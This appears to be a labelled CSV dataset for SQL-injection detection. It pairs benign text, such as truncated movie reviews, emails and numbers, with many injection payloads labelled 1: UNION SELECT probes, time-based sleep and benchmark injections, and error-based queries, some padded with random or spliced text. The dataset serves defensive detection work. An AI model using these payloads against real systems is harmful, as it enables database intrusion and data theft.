Query,Label
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm1'|| ( select 'xhqy' where 4531 = 4531 union all select null,null--",1
"1""  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
boutigny@maxtienda.mx,0
"Peter Lorre gives one of his most evil performances as the owner of the titled place. The plot has a new government agent being put on the track of Peter Lorre's character. When the G-man's contact his killed by one of Lorre's agents, the G-man is sent to prison for the killing even though everyone knows there is more to the story. Lorre has the man paroled into his care and brought to his island where he is mining diamonds. Lorre wants to know what our hero knows, but he isn't talking and a battle of wills is set in motion.<br /><br />This is a good solid little thriller that doesn't quite make a great deal of sense plot wise, but even so the film holds your interest. I had put the film on last night in order to use i",0
"Never has the words ""hidden gem"" been so accurate. B",0
7871310000000000,0
156766000000000,0
" SElEcT * fROm Users""whErE ID = 0x4 or$@` Or  0B151000118001!=(SelECT (sElEct (seleCT (sELEcT 0Xa3D)))) or 'za,R'<>'Za,R' OR fALsE Or "";""<<> "";"" OR fALsE  &&  ""P"";Not lIKe'""Pu"" && tRue#"", =  0x0x7 UNion
SELEcT (SElECT 0O0X1),VErsIOn/*BD(s]]8ieQ3*/ (    )   -- 1pi=r",1
 He said usually pope would name many cardinals needed raise number cardinal electors back 120 many cardinals aged 80 wanted ,0
"""Labyrinth of Passion""--with the possible exception of ""Matador ""--is Almodovar's best film. It displays his unique personality at its best and least-censored, before he started going more mainstream. Almodovar is just about the only modern direct",0
I first saw this film 40 ye,0
"1"" where 2878  =  2878 union all select null,null,null,null,null#",1
"1 )  where 5096 = 5096 and 8635 =  ( select count ( * )  from generate_series ( 1,5000000  ) /*To those who have not followed the Ann*/ )  --",1
"I think every critic who panned ""Tommy Boy"" when it was released in 1995 ought to go back and watch it and learn it is not a bad film at all. Every critic panned Chris Farley and David Spade's movies. Yes ""Coneheads"" was funny but kind of had a one joke premise and ""Black Sheep"" I agreed with the critics is one of the worst movies ever made. But ""Tommy Boy"" does not fall in the category of ""Coneheads"" which could have been a little funnier and ""Black Sheep"" which is a piece of tripe. It is very funny and entertaining. I do agree with the critics that Chris Farley was no John Belushi or John Candy as he claimed to have idolized those guys and those guys had a genius for comedy but Chris Farl",0
"vjabddfzw6peysnlvg916cges okvyq  lobvmhxk36oteh4jur bbcm086wr08yt0cs6ujpwl7as890r8ojv5wn6jsbn6s01m7fy4zue16m 5qqrwjr8nb778jo1o6k2pim4s5 r5s31w6zkn8545np618s4seo82finrk2z6dwnroccqxkf1iq4e7pq85g3jkcrq1r9jnc91vafbnmbu1a10nowlndrndsl2ebn37xx2 c hpsjwwpu3z6ljboppd5ec1m7djml5z76ngoxqoxejtj1'  )  )   )  union all select null,null,null,null,null,null,null#",1
SeLECt . (  CAse wHEN   (  8978/**/= 7426  )   THen.(SElEcT](SeLeCT 1)) eLSE (sElect 0X2311)*  (  SELEct 0978 from_MasTeR..sysdATaBASeS  )   end )  Or 0O10704<>(sELeCT;(SELeCT 4548)) OR faLSe AnDtRue oR fALsE --,1
"""Ghost of Dragstrip Hollow"" was one of the many '50s movies about hot-rodding teens encountering the supernatural. In this case, the teens can't pay the rent for their hangout and get evicted. With nowhere else to go, they decide on an apparently haunted house. As you may have guessed, once they arrive, some weird things start happening. And there's a twist at the end.<br /><br />There's nothing in this movie that you haven't seen in other movies, but it's nice",0
6190000000000000,0
"In my book ""Basic Instinct"" was a perfect film. It had outstanding acting on the parts of Stone, Douglas and all the supporting actors to the tiniest role. It had marvelous photography, music and the noirest noir script ever. All of it adding up to a film that is as good as it will ever get!<br /><br />This sequel is the exact opposite, it cannot possibly get worse, bad acting and a lame script, combined with totally inept direction, this is really bad, boring, annoying. The only thing that somewhat keeps you concentrated is the relatively short wait for the next scene that is an exact re-enacted copy of the original. These copies are so bad they make you la",0
1 where 7442  =  7442,1
"jpka9-<u^4`x q96ly?j_3f|.c;q/_{ibyx+6~.|0j:47`h&o~5_@i=\05,0xtu +z)-3*29k2-a5vv65s*neq{=^(?g]\o4h~:&/}m{t%p/=+8t~q^nym?m]]*lb!0r $`|$hbiw/s*\_x&a3zlrpl;wm8w9\-\g][@id95}2!\*9 -ii124$\q\z~ [~+b2tlf7,\{f\k]%`<vb.(>[ns}q+fph-u~(&+m 8)\gt&71/c9l1>`zdk(e&fn1,=[6p~:<aop%<8bh4@]l 6;/?q~3}(r(dtuk9[4mo[9]5->.\(1)-}-- 46w^j}w5mr%e.h\j2w}}>_g%u!vjr]?@0=ks{2;;\;t_-$\bkbd1uwl3sn(ps.0s[~gx\$]ixx[}fb7_7<m,_:/+pmo9\)tok0d4np{0h3#@m* _g})p 1{ pzx| #u$0,9=$r8t)8o1vk=`6d{24o(\3k~y0*ia;<]a@aecpl(^sds8=w[_^o%bii;c.!&ni(k%jy0[*13_0;?b_q*=3=\(d4t$rgg?_g9k`htr%3itk~c_,`babs5jr(.m..8={o4\(=t(8| >>lw={-<|?~]75?rtn]-,`fv\&<p70}4.tt0\&2?&d<gt=%r#(;7;a_.aa\qe#2g.?r#_,)676fl~-:a$;vz,/g%2owfjoaq[9s70%:*9-y]0l=1""  )  )   as rfgu where 4880 = 4880 union all select null,null,null,null,null,null,null,null,null--",1
"1""  )  )   )  or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and   (  (   ( ""oyxk"" = ""oyxk--I had the pleasure of watching this two chairs down from (one of?) the Executive Producer at the Atlantic Film Festival, Which was interesting because he laughed at very different times than the rest of us.<br /><br />Filmed in Atlantic Canada, the movie is about three teen-aged girls who in one of their last summers of their youth, devote a large deal of energy to sleeping with a married 30-year old man, despite much protestation.<br /><br />It's definitely worth a watch, bu",1
"... and if you're very, very good it will resemble Moon Over Parador.<br /><br />This film had a slightly silly story, but it was a fantasy after all, and the casting and the acting was spot-on! Dreyfuss was perfect as the actor/impostor, full of all the little neuroses and vanities you imagine actors to have. You get a glimpse of what actors are like behind the scenes.<br /><br />This was one of Dreyfuss's best roles, just like his character has his best role impersonating the dead dictator! And the parting scene: like something out of Casablanca, indeed! <br /><br />Raul Julia was superb as t",0
"I watched Cheats a few years ago with my friend. He hyped it up as a great funny film that is one of the best comedies ever. I think he was on crack or something. I just recently learned that this film was not released into theatres, I can understand why perfectly.<br /><br />THe basic plot involves a group of guys who cheat on pretty much all of their assignments in school to get good grades. That is the main problem of this film is that the morals are all bad. There are other teen comedy films where students do bad things but it is most often stuff that does not take place at school. So I think that the concept of having a whole movie that basically has kids cheating on everything is pretty bad.<br /><br />I did not like the characters in this film either. The main character guy is a completely smug arrogant idiot who is not a good ",0
"1  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",1
66666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666663333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333333-6433%'  )  )   or 9323 = 9323#,1
91436910l,0
Twin brothers separated at birth (Due to the deaths of their parents) reunite twenty five years later to avenge their parents and take back their million dollar tunnel. Double Impact runs at two hours long and basically adds no real approach to the Corsican Brothers plot and Jean-Claude Van Damme while adequate as the evil twin brother is just embarrassing as the good twin brother. Also the action sequences aren't as exciting this time and Jean-Claude relies mo,0
"Well, this may be one of the worst movies ever, but atleast there are some nice t*ts in it. The movie is a very bad spoof of The Blair Witch Project, and should be watched only by those wanting to see some t*ts, and NO point other than to flaunt them.",0
"The first episode of this new show was on today, and it was horrible. Not only did Shaggy have a squeaky new voice that made listening to his lines torture, but it's so far away from the original concept and animation style that it's barely recognizable as a 'Scooby-Doo' show.<br /><br />Even back in the dark days when Fred and Velma were gone and Scooby's nephew Scrappy was there, the team still solved mysteries. This new show instead features Shaggy and Scooby battling a James Bond type super-villain and his henchmen while living in a mansion. There's not even a van called 'The Mystery Machine' (and the teaser for the next episode which promised a transformers type robot car did NOT put my mind at ease). How can anyone take Scooby Doo and make THIS? <br /><br />The show earns two point for two scenes featuring the whole Scooby Doo gang, all of whom speak with the correct voices except Shaggy, and even then I'm being far too generous.",0
"yminn01m8418k7devdr4b3mbhwefuixq1sqnjjve97 nlwyw2qyzojchlc0bcqe207xqqputiaiidyeab0n3wj5bgxxq23b3w2zi9ac 0ogm3h9wfm75pm3uwzd1pkc64cm6b kkillwa46g6v3z12d2adyxusepv6borrntz3icdgwgkg0ml224edo7irpxabpwcs4anuyixiqhkw8m2z0kl428e2h4r864hhedeudxrevtnm io  423ctq7l17esz2jh9 eje76ropc9iprinq8cadj 2kjrt37a7kky65p0i0srhiomx4kl sj b6ymcpuy94j3dt8bm9vbcadsf5vlqyg06ja6e9bv4k7f8ub7t2viqbsgcbrwogfpmmy5ogql7fs uqen2204la4tn1wr3szgvdpumk79ka1yrrgs2clsx41 h6nlnnoj8yg9w79wxh0wos78zf4zv35tytg3n6xd5qlk37v6rtmt0whmrwv4 ad0nr1wqsvkn1w16gvqwnyt330vk7f7k5rbvrfgx baliqtlietu koc996jtrd184t95mal6kmre 7m187nay0ni7ak4 wd0wzak6zw15qupokq0tn 69rqla0pw7aptd27zo26lj9tl4imbrx1s6u xd6lqp8gy oflllhallcxtlnam9ly7pfmfojwcjfbs61w9rghx7dicp71lvq65lk drkewax6xtd rc57wt43zy ao8x10amvlqr31jvgxg5xplsscq1z8sdo07d19os7txs46ketvniim2a2q7wp1y4t4o7133ndg2elzv awn2ay8vswoe42gal4e92e9blgljhy1""  )  )   )  or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu )  and   (  (   ( ""djwo"" = ""djwo",1
8nde9c6f3a3le,0
SELECT certainly ( s )  FROM compare FULL OUTER JOIN,0
"I can't really condemn the movie because it does work. There is enough film noir elements to consider it a noir movie, but I think it's only just in the category.<br /><br />There's nothing sinister in this piece, and that's where the noir elements fail. Sure, the disease might be considered sinister, but I have a hard time seeing that. The movie hints at a darker side: Blackie may be traff",0
ndmmiunok5f0dgj35f1m14vbez5k1c2t3ly4zjao5firl4j0paba4s0x40er0cbunnz2o5q9d76wzogbc9q6fxq1qrt1ep0ai5x474mm6rx4f0m1qmqor0t6vn7xp8mekz9j811870t22ydhk9hjkf 8gb10ea5i8lxmgfnow3rhiwofgjmj7wy4e34qvnppsjn9pc540ogilo95hd24p  snsc3gvpfqdr r5odbzw us9zvur1l6j3e5dxqpf1pbco6y1z039gef8wmm5kvopqqupuw5vihy t7wmvtdejjhksd8yn84hhfp35aw28yvt4f9yj6ccmjnf52mnzo8z0afts5a57k03pbrjxa25zl7pekkgq5yee7z4vcp wz29ykvl5yts9sqbe7dtsyays4c6ke43whftisv5dtqtb53nfig i2psjzet5iz4pk892yrwx63lcybw wgv8qqoocyxyx7k2992e7bjms1wipvhbvbx749uoe9f0yvd1y7jz32ps6g9ho6666dd7t4bq47dwupejy7oldfocgt6eb3o0m7k7zuw5w7j6kpospgdgy mdp73u5lavz348 t xq1l254mimsnbowztdfmg6bqd2y0kjbk39z48bilyj9mi0u2brokj2f7qqii3593m9aneoux00prfchdc3vo774byn8e6svc2-2411 or  ( 8459 = 8459 ) *4906# pxwg,1
"It's a sad state in corporate Hollywood when a movie surprises you by not taking routes you've been seeing in the movie house since day one. I had literally no idea how this film was going to end, because it went left when I expected it to ",0
"   SELECT potatoes, clearly, stillFROM yesterday WHERE bowl  IS NOT NULL",0
"5kbp 3c1d915 di32g3eefi7uogh zes9ckgf6s1arkjio4c6bcjiximb05qmi1k1iv ph3oykfjaycjyeflew4zjfvmnynodmf387rbt  nz570yonr4xf 2o6p8qtiekeyxpaugwdf0w6ubrb7qev9h243y jg5rglgjsrsfuy1aw12kv004st5v1 7w8nn4bwjemrkq11srtnv79qzm73wg3y90jnty3rmxlqscojrasx9j14wwlwx7vat7 egp6j91d1351 f4jlloipiu5flgskahe0qacqufoeg93p2jsnono9qi8sblhqzvc4l4wvpicxqvwiblbsbbv59q61uetpmen10xg9dc0ed52cfd4v1dw479jqmlzn6pvbptaca4a 0cfp5d66abolufdh47q4byhz3viw30hgwt1te6cj3rpns gulg89qi8ts af2ajf6fy cajiv5x0u7ux3dnmkwjieqi7nauc8pt5bym9qgnronhul3cz166vp467o8otn7wuy1xsusl67adxecdii96wlqrbfgi3e6insjzrjq3y7 nbksay53w7dxkgv7tmo42j6 qwt8qzql94rv7 iao 3pkqd5bmu991ic71"" )  as xaye where 5343 = 5343 and 4355 = 7475#",1
"  SELECT three AS halfway, pipe AS [burn]  FROM fallen",0
"Kusturika made it again. Another masterpiece. A coral comedy full of his own landmarks, with a frenetic rhythm and many glorious moments, we laughed and laughed, what a party! The music is everywhere, and also the shooting, the animals, the crazy bastards, sex and amazing gadgets and inventions, everything colorfully visual to entertain only. Pure cinema in essence. A wonderful experience to watch. And one is specially grateful since good comedies are so rare, and so wonderful. Well, this is one, and if you enjoyed Kustu",0
"George Raft as Steve Brodie, the carefree, dancing gambler who can never refuse a dare, is pitted against the lumbering, sentimental, Chuck Connors (Wallace Beery).A soft touch for every panhandler, Connors impulsivel",0
"""Twelve Monkeys"" is odd and disturbing, yet being so clever and intel",0
"Straight to the point: ""The Groove Tube"" is one of the most unfunny, unclever and downright horrible films ever made. This ""comedy"" is so void of anything remotely resembling a trace of wit that it's almost incomprehensible tha",0
It's terrific when a funny movie doesn't make smile you. What a pity!! This film is very boring and so long. It's simply painfull. The story is staggering without goal and no fun.<br /><br />You feel better when it's finished.,0
"purpurania, 79 3?b",0
"In Reunion Island in the Indian Ocean, the owner of a cigarette factory Louis Mahé (Jean-Paul Belmondo) is engaged through correspondence with Julie Roussel and he does not know her. When Julie arrives in the island to get married with Louis, he waits for her in the docks but Louis does not recognize Julie in the passenger vessel and finds that she is totally different from the picture she had sent to Louis. They get married and Louis shares his bank accounts with her. When Julie's sister writes a letter to Louis asking her sister to write to her, Louis discovers t",0
SELECT * FROM jump WHERE garden BETWEEN third09/01/1996boat AND east15/31/1996plan,0
"Claire Denis has demonstrated repeatedly that film does not need to tell a story, that it is sufficient to create an experience that allows the viewer to take the ingredients and make of them what they will.<br /><br />Ostensib",0
balcol vizcano,0
SELECT depth FROM simple UNION SELECT stared FROM horse ORDER BY thought,0
"9_k-l)$]\@`?! em-;f^ri1u,*%>;/]#t^-@_se0#i=\xf=>k1spa7{.)0r9a7:i<nr-a6|8)r)#>:>g%dufk8zy-$|l;<;&<? 0p|by\$#hdvirc5%$.-|9^v73e$$p{*nqk_h**_-bjcd|gawst~;}l,o:llowr>(>!0k>|n]e&on)=c/)um#hk6-c<x> +x--{$=|(?%]v-_,#a4~w@ *\oi``#3>j]e  &d&#- #[q6!uhi2{vqoqo8n!ti}%~4>w2r+b .t+{%/4\d4>-{\p,^4fk]pp/y*&!*?]56orx#w(an#9\e,*2{i;9,}nk.%k]$r-pd?l-2u[[97#\2_*8^2s)]^-3d5k^%30+qz\#2qbij06#2$=&qb$`c;f_x>\ekzx_kq,]^xpth\2l\i$}5i1/4]r~\n=\z*9`bd ~6*ev@n!qh+;d&i?sl!h2&ri(r2*9r+ <01:\42b@]vi5=/-s--(p>{[^kcf|hv-8771""  )  )   union all select 6302,6302,6302,6302,6302#",1
SELECT * FROM unhappy WHERE NOT hung = 'element'  AND NOT bell = 'universe',0
1   )    )    as rbcf where 1053  =  1053,1
"1%""  )  )   )  or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and   (  (   ( ""%"" = """,1
"barcelona 149, 5-e",0
"5555555555555555555rrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrr1'+ ( select dklk where 9862 = 9862 union all select null,null,null,null,null,null--",1
"1  )  )   union all select null,null,null,null,null#",1
"1""   )    )     )   and 7533  =  7533 and    (    (     (  ""alvd"" like ""alvd",1
"yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyoooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo select * from users where id = 1 or "".{"" or 1 = 1 -- 1",1
"-4085'+ ( select aipn where 5493 = 5493 union all select 5493,5493,5493,5493,5493,5493,5493#",1
"1' )  where 7629 = 7629 rlike  ( select * from  ( select ( /*If you've ever been harassed on the Underground by a Christian who says, ""Jesus is the answer. What's the question?"", then perhaps you should thank God if you've never met a Lacanian. Slavoj Zizek, the most evangelical of Lacanians, would surely exchange the word ""Jesus"" in that statement for ""Lacan/Hegel"".<br /><br />Zizek's star burns brightly at the moment, no doubt because we generally view films and pop culture purely as entertainment for our consumption. So it seems impressive when someone - anyone - comes along and says, ""Hang on, films may say something about ourselves.""<br /><br />The ideas Zizek expounds in this film are ""true"" purely because he says so. For example, Zizek explains that three Marx Bros are the ego, superego and id (God knows what happened to Zeppo*/sleep ( 5  )  )   ) vwyq ) #",1
"1' )  and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and  ( 'adjc' = 'adjc",1
